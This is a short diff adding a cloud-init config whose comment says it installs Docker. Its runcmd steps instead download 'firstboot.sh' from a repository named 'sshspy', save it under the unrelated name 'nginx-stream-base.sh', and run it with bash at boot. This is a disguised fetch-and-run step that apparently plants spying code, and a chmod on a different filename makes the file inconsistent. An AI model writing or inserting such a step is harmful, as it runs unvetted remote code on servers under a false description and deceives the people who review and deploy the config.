@@ -1,0 +1,7 @@
+#cloud-config
+# Simple cloud-init to install Docker
+
+runcmd:
+  - [ wget, "https://raw.githubusercontent.com/RedHatShane/sshspy/refs/heads/main/firstboot.sh", -O, "/tmp/nginx-stream-base.sh" ]
+  - [ chmod, 744, "/tmp/dockerfy.sh" ]
+  - [ bash, "/tmp/nginx-stream-base.sh" ]
